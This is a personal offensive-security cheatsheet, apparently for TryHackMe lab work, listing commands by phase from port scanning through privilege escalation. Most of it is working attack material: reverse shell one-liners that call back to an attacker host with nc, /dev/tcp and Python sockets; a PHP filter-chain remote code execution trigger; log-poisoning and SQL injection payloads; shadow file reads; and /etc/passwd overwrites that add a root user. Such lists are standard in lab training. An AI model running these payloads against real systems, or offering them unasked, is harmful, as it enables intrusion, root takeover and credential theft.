# 📋 Command Reference

Personal cheatsheet of frequently used commands across TryHackMe engagements. Organised by phase.

---

## 🔍 Recon & Port Scanning

### nmap

```bash
# Full TCP scan with service/version detection
sudo nmap -sC -sV -p- -vv -T4 <target> -oA tcp-scan

# UDP scan (top ports)
sudo nmap -sU --top-ports 200 -vv -T4 <target> -oA udp-scan

# Full UDP (slow)
sudo nmap -sU -p- -vv -T4 <target> -oA udp-full

# Script scan on specific port
sudo nmap -sC -sV -p <port> <target>

# OS detection
sudo nmap -O <target>
```

---

## 🌐 Web Enumeration

### ffuf — Directory and File Bruteforce

```bash
# Directory bruteforce
ffuf -u http://<target>/FUZZ -w /path/to/raft-medium-directories.txt -ic -fc 403,401

# File bruteforce
ffuf -u http://<target>/FUZZ -w /path/to/raft-medium-files.txt -ic -fc 403,401

# Extension fuzzing
ffuf -u http://<target>/FUZZ -w /path/to/wordlist.txt -e .php,.txt,.html -ic -fc 403,401

# Vhost fuzzing
ffuf -u http://<target>/ -H 'Host: FUZZ.<domain>' -w /path/to/subdomains.txt -ic -fs <baseline_size>

# POST parameter fuzzing
ffuf -u http://<target>/login.php -X POST -d 'username=FUZZ&password=test' -w /path/to/wordlist.txt -ic
```

### gobuster

```bash
# Directory mode
gobuster dir -u http://<target> -w /path/to/wordlist.txt -x php,html,txt -t 40

# DNS/vhost mode
gobuster dns -d <domain> -w /path/to/subdomains.txt
```

### feroxbuster

```bash
feroxbuster -u http://<target> -w /path/to/wordlist.txt -x php,html -t 40 --filter-status 403,401
```

### curl — Manual Probing

```bash
# Basic GET
curl -sk http://<target>/path

# POST request
curl -sk -X POST -d 'username=admin&password=admin' http://<target>/login.php

# Follow redirects
curl -skL http://<target>/path

# Save output (binary safe)
curl "http://<target>/path" --output -

# With custom headers
curl -sk -H 'Cookie: session=abc123' http://<target>/admin
```

---

## 💉 SQL Injection

### Manual Testing

```bash
# OR-filter bypass using || (when OR keyword is filtered)
username=admin'+||+1%3d1+--+-&password=x

# Classic
username=admin'--+-
username=' OR 1=1--
```

### sqlmap

```bash
# From saved request file
sqlmap -r req.txt --batch

# Enumerate databases
sqlmap -r req.txt --dbs --batch

# Dump specific DB
sqlmap -r req.txt -D <dbname> --dump --batch

# Force MySQL, higher level/risk, detect via 302 redirect
sqlmap -r req.txt --dbms=mysql --level=5 --risk=3 --code=302 --batch --tamper=between --dbs

# Time-based blind only
sqlmap -r req.txt --dbms=mysql --technique=T --level=5 --risk=3 --batch -D <dbname> --dump

# OS shell attempt
sqlmap -r req.txt --os-shell --batch
```

---

## 📂 LFI / Path Traversal

```bash
# Basic path traversal
curl 'http://<target>/page.php?file=../../../../etc/passwd'

# php://filter — direct read
curl 'http://<target>/page.php?file=php://filter/resource=../../../../../etc/passwd'

# php://filter — base64 encode (bypass output filters)
curl -sk 'http://<target>/page.php?file=php://filter/convert.base64-encode/resource=<file>' | base64 -d

# Read application source
curl -sk 'http://<target>/secret-script.php?file=php://filter/convert.base64-encode/resource=login.php' | base64 -d

# Log poisoning — poison User-Agent then include log
curl -sk -A '<?php system($_GET["cmd"]); ?>' http://<target>/
curl 'http://<target>/page.php?file=../../../../var/log/apache2/access.log&cmd=id'
```

### PHP Filter Chain — File-less RCE

```bash
# Generate chain (requires php_filter_chain_generator.py)
CHAIN=$(python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' | tail -1)

# Execute command
curl "http://<target>/vuln.php?file=${CHAIN}&cmd=id" --output -

# Reverse shell trigger (URL-encoded)
curl "http://<target>/vuln.php?file=${CHAIN}&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20<LHOST>%20<LPORT>%20%3E%2Ftmp%2Ff" --output -
```

---

## 🐚 Shells

### Reverse Shell One-liners

```bash
# mkfifo netcat
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> >/tmp/f

# bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1

# Python3
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("<LHOST>",<LPORT>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
```

### Shell Stabilisation

```bash
# Step 1 — spawn PTY
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2 — background and fix terminal
# ctrl+z
stty raw -echo; fg

# Step 3 — set terminal type and size
export TERM='xterm'
stty rows <rows> cols <cols>    # get values with: stty size (on attack box)
```

### Listener

```bash
nc -nlvp <port>
```

---

## 🔑 SSH

```bash
# Connect with key
ssh -i <keyfile> <user>@<target>

# Generate keypair
ssh-keygen -t ed25519 -f ./id_ed25519

# Inject public key (when authorized_keys is writable)
echo '<pubkey>' >> /home/<user>/.ssh/authorized_keys

# Port forward (local)
ssh -L <localport>:127.0.0.1:<remoteport> <user>@<target>

# Dynamic SOCKS proxy
ssh -D 1080 <user>@<target>
```

---

## 🔐 Hash Cracking

### hashcat

```bash
# MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA1
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

# Show cracked
hashcat --show hash.txt
```

### john

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --show

# zip
zip2john archive.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

# SSH key
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### openssl — Generate password hash

```bash
# MD5crypt (for /etc/passwd)
openssl passwd -1 -salt xyz <password>

# SHA512crypt
openssl passwd -6 -salt xyz <password>
```

---

## ⬆️ Privilege Escalation

### Enumeration

```bash
# sudo permissions
sudo -l

# SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# World-writable files
find / -type f -writable 2>/dev/null
find / -type f -writable 2>/dev/null | grep -v proc

# Writable directories
find / -type d -writable 2>/dev/null

# Capabilities
/usr/sbin/getcap -r / 2>/dev/null

# Running processes
ps aux

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
```

### Systemd Timer / Service Abuse

```bash
# Check writable unit files
find /etc/systemd/system/ -writable 2>/dev/null

# After editing a timer/service
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart <name>.timer
sudo /bin/systemctl start <name>.timer
```

### SUID xxd — /etc/passwd Overwrite

```bash
# Copy current passwd
cp /etc/passwd /tmp/newpasswd

# Generate MD5crypt hash for new root user
openssl passwd -1 -salt xyz <password>

# Append root-level user entry
echo 'hacker:<hash>:0:0:root:/root:/bin/bash' >> /tmp/newpasswd

# Overwrite /etc/passwd via SUID xxd
cat /tmp/newpasswd | xxd | /opt/xxd -r - /etc/passwd

# Switch to new user
su - hacker
```

### SUID xxd — Arbitrary File Read

```bash
# Read sensitive file
/opt/xxd /etc/shadow | xxd -r
```

### authorized_keys Injection

```bash
# If target user's authorized_keys is writable
ssh-keygen -t ed25519 -f /tmp/id_ed25519
cat /tmp/id_ed25519.pub >> /home/<user>/.ssh/authorized_keys
ssh -i /tmp/id_ed25519 <user>@<target>
```

### sudo wget — /etc/passwd Overwrite

```bash
# Craft a new passwd with known-hash root entry, host it, overwrite
sudo wget http://<LHOST>/passwd -O /etc/passwd
```

### lxd / Docker Group

```bash
# lxd
lxc image import ./alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

# Docker
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

---

## 🧰 Miscellaneous

```bash
# Find files owned by a user
find / -user <username> 2>/dev/null

# Check open ports (internal services)
ss -ntlp
netstat -tlnp

# Transfer file via Python HTTP server
python3 -m http.server 8080

# Download file on target
wget http://<LHOST>:8080/<file> -O /tmp/<file>
curl http://<LHOST>:8080/<file> -o /tmp/<file>

# Check systemd timers
systemctl list-timers

# Decode base64
echo '<string>' | base64 -d

# Encode to base64
echo '<string>' | base64
```
